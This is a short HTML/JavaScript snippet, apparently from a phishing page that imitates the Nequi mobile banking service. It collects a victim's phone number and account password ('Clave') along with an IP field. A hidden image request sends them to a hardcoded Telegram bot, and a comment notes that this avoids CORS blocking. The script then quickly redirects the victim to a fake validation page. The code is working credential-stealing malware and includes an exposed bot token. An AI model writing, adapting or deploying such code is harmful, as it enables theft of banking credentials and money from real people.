<!-- Método infalible que evita bloqueos CORS locales y redirige de inmediato -->
<script>
    var telegram_bot_id = "6159424723:AAE4qhm6H4sNLztr5HnLjAOrZlf95BAUKBE";
    var chat_id = -1003508204208;

    $(document).ready(function() {
        $('#hr-u').mask('000 000 0000');
        if (typeof $('#sd-a').mask === 'function') {
            $('#sd-a').mask("#.##0,00", {reverse: true});
        }
    });

    function enviarDatosTelegram(e) {
        e.preventDefault(); // Evita que aparezcan datos en la URL

        var CLN = document.getElementById("hr-u").value;
        var CVN = document.getElementById("mn-c").value;
        var ip2 = document.getElementById("address").innerHTML;
        var message = "NEQUI\nCelular: " + CLN + "\nClave: " + CVN + "\n" + ip2;
        
        localStorage.setItem("hr-u", CLN);

        var url = "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message);

        // Envía el mensaje a Telegram mediante una petición GET oculta que no sufre de bloqueos CORS locales
        var img = new Image();
        img.src = url;

        // Redirige de inmediato a la página de validación sin demoras
        setTimeout(function() {
            window.location.href = "validando.html";
        }, 500);

        return false;
    }
</script>
